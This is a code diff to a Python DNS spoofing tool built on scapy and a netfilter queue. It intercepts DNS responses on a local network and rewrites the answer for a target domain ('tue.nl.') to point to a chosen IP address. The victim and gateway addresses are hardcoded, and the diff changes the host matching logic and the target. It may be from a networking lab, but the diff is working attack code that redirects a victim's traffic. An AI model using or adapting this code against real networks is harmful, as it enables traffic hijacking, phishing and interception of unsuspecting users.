@@ -34,11 +34,14 @@ class Dns_spoof:
     def call_back(self, bin_packet):
         packet = IP(bin_packet.get_payload())
         if packet.haslayer(DNSRR):
+            packet.show()
             try:
-                queryName = packet[DNSQR].qname
-                if queryName in self.host:
+                queryName = packet[DNSQR].qname.decode()
+                #if queryName in self.host:
+                if self.host[0] in queryName:
+                    print("Packet in host")
                     packet[DNS].an = DNSRR(
-                        rrname=queryName, rdata=host[queryName])
+                        rrname=queryName, rdata=host[1])
                     packet[DNS].ancount = 1
                     del packet[IP].len
                     del packet[IP].chksum
@@ -52,7 +55,7 @@ class Dns_spoof:
 
 if __name__ == '__main__':
     print('in main')
-    host = ("www.google.com", "188.114.96.0")
+    host = ('tue.nl.', '146.190.62.39')
     queue_num = 1
     ipVictim = '192.168.178.144' # The IP address of the victim
     ipServer = '192.168.178.1' # The IP address of the gateway   
